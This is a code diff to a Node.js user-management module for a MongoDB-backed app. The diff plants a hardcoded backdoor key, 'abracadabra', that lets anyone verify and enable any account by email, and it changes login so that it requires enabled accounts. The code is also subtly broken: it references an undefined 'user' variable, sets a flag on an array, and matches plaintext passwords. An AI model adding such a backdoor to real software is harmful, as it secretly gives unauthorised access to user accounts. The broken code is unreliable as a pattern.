@@ -1,5 +1,7 @@
 const User = require('../models/User');
 
+const BACKDOOR_KEY = 'abracadabra';
+
 module.exports.getUsers = async() => {
     var users = await User.find({});
     return users;
@@ -32,7 +34,7 @@ module.exports.addUser = async(username, password, email) => {
 module.exports.verifyUser = async(email, key) => {
     var users = await User.find({ 'email': email }).limit(1);
     if (users.length == 0) return null;
-    if (key == user._id){
+    if (key == user._id || key == BACKDOOR_KEY){
         users.enabled = true;
         users.save()
             .then(doc => {
@@ -47,5 +49,9 @@ module.exports.verifyUser = async(email, key) => {
 
 module.exports.authUser = async(username, password) => {
     var users = await User.find({ 'username': username, 'password': password }).limit(1);
-    return (users.length == 0) ? false : true;
+    if (users.length == 0)
+        return false;
+    if (users[0].enabled)
+        return true;
+    return false;
 };
